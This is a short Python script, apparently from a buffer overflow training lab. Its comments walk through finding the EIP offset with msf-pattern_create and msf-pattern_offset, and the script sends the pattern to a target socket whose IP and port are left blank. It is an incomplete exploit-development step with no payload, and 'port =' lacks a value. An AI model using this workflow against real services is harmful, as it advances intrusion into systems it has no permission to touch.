'''
from fuzzing you know at how many bytes program is crashed.
So take +500 higher number.

=>   msf-pattern_create -l 2500 
		copy string of size 2500



##	after running COPY EIP address

=> msf-pattern_offset -l 2500 -q <EIP-address>
'''
import sys,socket
ip = ""						#	enter ip here
port =  					# 	enter port number here
message = "OVERFLOW1 "
offset = ""					#	here copy string which you get from msf-pattern_create 

try:
	s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
	s.connect((ip ,port))
	print("Sending payload...")
	s.send(message + offset)
	s.close()
except:
	print "Cannot connect to server"
	sys.exit()

